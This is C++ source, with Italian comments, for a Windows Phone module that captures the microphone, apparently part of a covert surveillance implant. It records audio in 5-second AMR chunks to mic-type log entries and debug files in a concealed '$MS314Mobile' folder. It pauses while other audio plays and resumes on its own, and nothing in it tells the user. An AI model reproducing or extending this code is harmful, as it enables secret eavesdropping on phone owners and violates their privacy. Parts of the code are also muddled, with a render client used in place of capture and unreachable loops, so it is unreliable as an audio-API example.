#include "NativeAudioInterface.h"
#include "FunctionFunc.h"
#include "Log.h"
#include "Microphone.h"
#include "Audioclient.h"
#include "phoneaudioclient.h"

#pragma comment(lib, "Phoneaudioses.lib")


using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;

//messo qua per poter forzare lo stop da dentro OnSampleAvailable
Windows::Phone::Media::Capture::AudioVideoCaptureDevice ^pAudioVideoCaptureDevice;



#include <time.h>


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21

//#define DTTMFMTAUD "%Y%m%d%H%M%Sxxxxxx"
#define DTTMFMTAUD "%Y%m%d%H%M%S"
#define DTTMSZAUD 16


static int COSTRUITO=0;

static char *getDtTmAUD (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZAUD, DTTMFMTAUD, localtime (&t));
    return buff;
}

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;
using namespace NativeAudioInterface::Native;
static int fAudio=FALSE;

MicAdditionalData mad2;



// Called each time a captured frame is available	
void CameraCaptureSampleSink::OnSampleAvailable(
	ULONGLONG hnsPresentationTime,
	ULONGLONG hnsSampleDuration,
	DWORD cbSample,
	BYTE* pSample)
{



	static char nomeFileBase[DTTMSZAUD];

	// creo file da 5sec 

	//1MB di buffer
	static BYTE bufferTmp[1024*512];
#ifdef _DEBUG
	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio")+DTTMSZAUD+1+6];
#endif
	
	Log log;

	// hnsPresentationTime aumenta partendo da 0 allo start, 1 sec=10000000
	 // Header= 35, 33, 65, 77, 82, 10
	 // Header= 23  21  41  4D  52  0A

	//per evitare gli ultimi campionamenti spuri evito di eseguire ulteriore codice 
	//if (NativeAudioInterface::Native::NativeCapture::fAudioCaptureForceStop==TRUE) return;
	if (NativeCapture::fAudioCaptureForceStop==TRUE) return;

	if(NativeCapture::pos==0&&NativeCapture::nCamp==1)
	{
		BYTE HEADER[]={35, 33, 65, 77, 82, 10};
		
		memcpy(bufferTmp,HEADER,sizeof(HEADER));
		NativeCapture::pos=sizeof(HEADER);

		//creo il nome del file come data file (poi vedro' come criptarli)
		char buff[DTTMSZAUD];
   		getDtTmAUD(buff);
		strcpy(nomeFileBase,buff);

		//
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n1Header) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
#endif

		
		unsigned __int64 temp_time = GetTime();
	
		ZeroMemory(&mad2, sizeof(mad2));
		mad2.uVersion = MIC_LOG_VERSION;
		mad2.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_AMR;
		mad2.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
		mad2.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);

	}
	//else 
	//	pos=0;

	
	memcpy(bufferTmp+NativeCapture::pos,pSample,cbSample);
	NativeCapture::pos=NativeCapture::pos+cbSample;

	//catturo blocchi di 5 sec 
	/*
	if((hnsPresentationTime>(ULONGLONG)5*10000000) && (NativeAudioInterface::Native::NativeCapture::fAudioCapture==TRUE))
	{
		NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
		fstream filestr;
		sprintf(nomeFile,"audio%s_%i.amr",nomeFileBase,nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, pos);
		filestr.close();
		OutputDebugStringA(nomeFile);
		//pos=0;
		nCamp++;
	}
	*/
	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(NativeCapture::fAudioCapture==FALSE || b==0)
	{
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);


		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
		fstream filestr;
		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
		filestr.close();
#endif
		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
			{
				return;
			}

			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );

		log.CloseLog();
#ifdef _DEBUG
		OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
		NativeCapture::fAudioCaptureForceStop=TRUE;
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		if(b==0) 
		{
			////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
			NativeCapture::fAudioCapture=FALSE;
			
			Log logInfo;
			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");

			NativeCapture::fStartPlay=FALSE;
			pAudioVideoCaptureDevice->StopRecordingAsync();
		}
	}
	else if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
		{
			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
#ifdef _DEBUG
			WCHAR msg[128];
			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%x\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);



			fstream filestr;
			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
			filestr.seekg (0, ios::beg);
			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
			filestr.close();
#endif
			if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
			{
				return;
			}

			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
#ifdef _DEBUG
			OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
			NativeCapture::pos=0;
			NativeCapture::nCamp++;
		}
	

}

void NativeCapture::StopCapture()
{
	
	fAudioCapture=FALSE;	
/***
	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
***/
	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
	
	
	//se è gia' false significa l'ho stoppato precedentemente 
   	if(fStartPlay==TRUE) 
	{
		fStartPlay=FALSE;
		pAudioVideoCaptureDevice->StopRecordingAsync();
	}
	
 



	//pAudioVideoCaptureDevice=nullptr;

}

#include <thread>
#include <chrono>


class MyAudioSink
{
private:
        int counter;
		fstream filestr;
public:
        MyAudioSink()
        {
                counter = 0;
				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
				filestr.seekg (0, ios::beg);
				
        }

        HRESULT SetFormat(WAVEFORMATEX *pwfx)
        {
                return 0;
        }

        HRESULT CopyData(BYTE *pData, UINT32 numFramesAvailable, BOOL *bDone)
        {
                printf("%i\n", numFramesAvailable);
                counter++;
                if (counter > 2000) {
						filestr.close();
                        return -1;
                }
                else
                {
						filestr.write ((const char*)pData, numFramesAvailable);
                        return 0;
                }
        }
};

//-----------------------------------------------------------
// Record an audio stream from the default audio capture
// device. The RecordAudioStream function allocates a shared
// buffer big enough to hold one second of PCM audio data.
// The function uses this buffer to stream data from the
// capture device. The main loop runs every 1/2 second.
//-----------------------------------------------------------

// REFERENCE_TIME time units per second and per millisecond
#define REFTIMES_PER_SEC  10000000
#define REFTIMES_PER_MILLISEC  10000

#define EXIT_ON_ERROR(hres)  \
              if (FAILED(hres)) { goto Exit; }
#define SAFE_RELEASE(punk)  \
              if ((punk) != NULL)  \
                { (punk)->Release(); (punk) = NULL; }

//const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
//const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
const IID IID_IAudioClient = __uuidof(IAudioClient);
const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);


/* FUNZIONA PER EGISTRARE MA QUANDO SI DISIDRATA L'app va in silent
HRESULT RecordAudioStream(MyAudioSink *pMySink)
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    REFERENCE_TIME hnsActualDuration;
    UINT32 bufferFrameCount;
    UINT32 numFramesAvailable;
    
	//IMMDeviceEnumerator *pEnumerator = NULL;
    //IMMDevice *pDevice = NULL;

    IAudioClient *pAudioClient = NULL;
    IAudioCaptureClient *pCaptureClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;
    BYTE *pData;
    DWORD flags;

	
	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
	

    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)


 
     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));


    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

    hr = pAudioClient->GetService(
                         IID_IAudioCaptureClient,
                         (void**)&pCaptureClient);
    EXIT_ON_ERROR(hr)

    // Notify the audio sink which format to use.
    hr = pMySink->SetFormat(pwfx);
    EXIT_ON_ERROR(hr)

    // Calculate the actual duration of the allocated buffer.
    hnsActualDuration = (double)REFTIMES_PER_SEC *
                     bufferFrameCount / pwfx->nSamplesPerSec;

	
	OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

    // Each loop fills about half of the shared buffer.
    while (bDone == FALSE)
    {
        // Sleep for half the buffer duration.
        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);

        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        EXIT_ON_ERROR(hr)

        while (packetLength != 0)
        {
            // Get the available data in the shared buffer.
            hr = pCaptureClient->GetBuffer(
                                   &pData,
                                   &numFramesAvailable,
                                   &flags, NULL, NULL);
            EXIT_ON_ERROR(hr)

            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
            {
                pData = NULL;  // Tell CopyData to write silence.
				OutputDebugString(L"silence\n");
            }
			else
			{
			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;

			WCHAR msg[128];
			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);

            // Copy the available capture data to the audio sink.
            hr = pMySink->CopyData(
                              pData, dataSize, &bDone);
            EXIT_ON_ERROR(hr)
			}
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            EXIT_ON_ERROR(hr)

            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            EXIT_ON_ERROR(hr)
        }
    }


	OutputDebugString(L"STOP\n");
    hr = pAudioClient->Stop();  // Stop recording.
    EXIT_ON_ERROR(hr)

Exit:
    CoTaskMemFree(pwfx);
//    SAFE_RELEASE(pEnumerator)
 //   SAFE_RELEASE(pDevice);
    SAFE_RELEASE(pAudioClient);
    SAFE_RELEASE(pCaptureClient);

    return hr;
}
*/

	HRESULT RecordAudioStream(MyAudioSink *pMySink)
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    REFERENCE_TIME hnsActualDuration;
    UINT32 bufferFrameCount;
    UINT32 numFramesAvailable;
    
	//IMMDeviceEnumerator *pEnumerator = NULL;
    //IMMDevice *pDevice = NULL;

    IAudioClient *pAudioClient = NULL;
    IAudioCaptureClient *pCaptureClient = NULL;
	IAudioRenderClient* m_pRenderClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;
    BYTE *pData;
    DWORD flags;

	

	/*
    hr = CoCreateInstance(
           CLSID_MMDeviceEnumerator, NULL,
           CLSCTX_ALL, IID_IMMDeviceEnumerator,
           (void**)&pEnumerator);
    EXIT_ON_ERROR(hr)

    hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
    EXIT_ON_ERROR(hr)
	*/

	//LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
	//LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Default);
	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
	

	/*
    hr = pDevice->Activate(
                    IID_IAudioClient, CLSCTX_ALL,
                    NULL, (void**)&pAudioClient);
    EXIT_ON_ERROR(hr)
	*/

    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)


 
     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));


    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0,
						 //AUDCLNT_STREAMFLAGS_LOOPBACK,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

  //  hr = pAudioClient->GetService(IID_IAudioCaptureClient,(void**)&pCaptureClient);
	 hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);

    EXIT_ON_ERROR(hr)

    // Notify the audio sink which format to use.
    hr = pMySink->SetFormat(pwfx);
    EXIT_ON_ERROR(hr)

    // Calculate the actual duration of the allocated buffer.
    hnsActualDuration = (double)REFTIMES_PER_SEC *
                     bufferFrameCount / pwfx->nSamplesPerSec;

	
	OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

	_Sleep(1000);
	hr = pAudioClient->Stop();  // Start recording.
	goto Exit;

    // Each loop fills about half of the shared buffer.
    while (bDone == FALSE)
    {
        // Sleep for half the buffer duration.
        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);

        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        EXIT_ON_ERROR(hr)

        while (packetLength != 0)
        {
            // Get the available data in the shared buffer.
            hr = pCaptureClient->GetBuffer(
                                   &pData,
                                   &numFramesAvailable,
                                   &flags, NULL, NULL);
            EXIT_ON_ERROR(hr)

            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
            {
                pData = NULL;  // Tell CopyData to write silence.
				OutputDebugString(L"silence\n");
            }
			else
			{
			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;

			WCHAR msg[128];
			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);

            // Copy the available capture data to the audio sink.
            hr = pMySink->CopyData(
                              pData, dataSize, &bDone);
            EXIT_ON_ERROR(hr)
			}
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            EXIT_ON_ERROR(hr)

            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            EXIT_ON_ERROR(hr)
        }
    }


	OutputDebugString(L"STOP\n");
    hr = pAudioClient->Stop();  // Stop recording.
    EXIT_ON_ERROR(hr)

Exit:
    CoTaskMemFree(pwfx);
//    SAFE_RELEASE(pEnumerator)
 //   SAFE_RELEASE(pDevice);
    SAFE_RELEASE(pAudioClient);
    SAFE_RELEASE(pCaptureClient);

    return hr;
}




int NativeCapture::StartCapture(HANDLE eventHandle)
{
	fAudioCapture=TRUE;	
	NativeCapture::fAudioCaptureForceStop=FALSE;

/***
	Windows::Foundation::TimeSpan span;
	span.Duration = 30000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
***/

	//mi sconnetto dal servizio che mi tira su la possibiblita' di controllare il playng in bg dell'audio
	//non posso ceccare se sono gia' precedentemente connesso
	_ZMediaQueue_ConnectToService();

	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(b==1)
	{
		//OutputDebugString(L"Nessun play attivo");	
		fStartPlay=TRUE;

		/*
		Microsoft::WRL::ComPtr<IAudioClient> m_pAudioClient = NULL;
		WAVEFORMATEX *m_pwfx = NULL;

		LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
		HRESULT hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&m_pAudioClient);
		hr = m_pAudioClient->GetMixFormat(&m_pwfx);
		//m_frameSizeInBytes = (m_pwfx->wBitsPerSample / 8) * m_pwfx->nChannels;
		//hr = m_pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_NOPERSIST | AUDCLNT_STREAMFLAGS_EVENTCALLBACK, latency * 10000, 0, m_pwfx, NULL);
		hr = m_pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_NOPERSIST | AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 10000000, 0, m_pwfx, NULL);
		HANDLE m_hCaptureEvent=NULL;
		hr = m_pAudioClient->SetEventHandle(m_hCaptureEvent);
		IAudioCaptureClient *m_pCaptureClient = NULL;
		hr = m_pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&m_pCaptureClient);
		*/
		
		
		
		//adesso ho riscritto RecordAudioStream per fare un render anziche' un capture nella speranza che inizializza lo speacker e non si sente piu' il glic
		MyAudioSink pMyAudioSink;
		RecordAudioStream(&pMyAudioSink);

		//DWORD RecordAudioStreamThreadId;
		//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);

		
		pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
		/////_ZMediaQueue_DisconnectFromService();
		return FALSE;
	}

	//OutputDebugString(L"Play attivo");
	Log logInfo;
	logInfo.WriteLogInfo(L"Can not activate microphone while background audio is playing, standing by");

	//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
	while(fAudioCapture==TRUE && _WaitForSingleObject(eventHandle, 10000))
	{
		_Media_Queue_GameHasControl(&b);
		if(b==1)
		{
			//OutputDebugString(L"Nessun play attivo");	
			fStartPlay=TRUE;
			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
			/////_ZMediaQueue_DisconnectFromService();
			return TRUE;
		}
	}


return TRUE;

		
		/*****
		//acrocchio che mi permette di aspettare sino a 10 sec che sia completata 
		//l'operazioe di inizializzazione tramite IAsyncOperation (non riesco a trovare un metodo piu' pulito)
		for(int i=0;i<20;i++)
		{
			
			auto stato=openOperation->Status;
			//if (openOperation->Status!=Windows::Foundation::AsyncStatus::Started) 
			if (openOperation->Status==Windows::Foundation::AsyncStatus::Completed)
				{
					fAudioCaptureForceStop=FALSE;
					pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
					break;
				}
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
		}
		****/


}

NativeAudioInterface::Native::NativeCapture::NativeCapture()
{
	fStartPlay=FALSE;
	fAudioCapture=FALSE;
	/*****
	abilitando non rifaccio un nuovo new per ogni volta che devo attivare il microfono ma sfrutto quanto gia'  allocato in precedenza
	visto che dai test fatti in AudioOnly.sln diventa instabile
	if (COSTRUITO>0)
	{
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		return;
	}
	else COSTRUITO++;
	*****/
/*****
	//IAsyncOperation<AudioVideoCaptureDevice^> ^openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();
	openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();

	openOperation->Completed = ref new AsyncOperationCompletedHandler<AudioVideoCaptureDevice^>(
		[this] (IAsyncOperation<AudioVideoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
		{
			if (status == Windows::Foundation::AsyncStatus::Completed)
			{
				auto captureDevice = operation->GetResults();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;


				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		}
	);
	***/

	//converto da asincrono ad sincrono l'inizializzazione del mic

	concurrency::cancellation_token_source AudioTaskTokenSource;

	task<AudioVideoCaptureDevice^> AudioTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), AudioTaskTokenSource.get_token());


	AudioTask.then([=](task<AudioVideoCaptureDevice^> getAudioTask)
	{
		/*****
				AudioVideoCaptureDevice^ captureDevice  = getPosTask.get();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;
		*****/

				pAudioVideoCaptureDevice = getAudioTask.get();
/***
				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
***/			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		
	).wait();

	// non serve: _Sleep(2000); //inserito per vedere se ritardando si evita il tak che capita ogni tanto sui lumia
	NativeCapture::pos=0;
	NativeCapture::nCamp=1;
#ifdef _DEBUG
	OutputDebugString(L"0Init) \n");
#endif
}
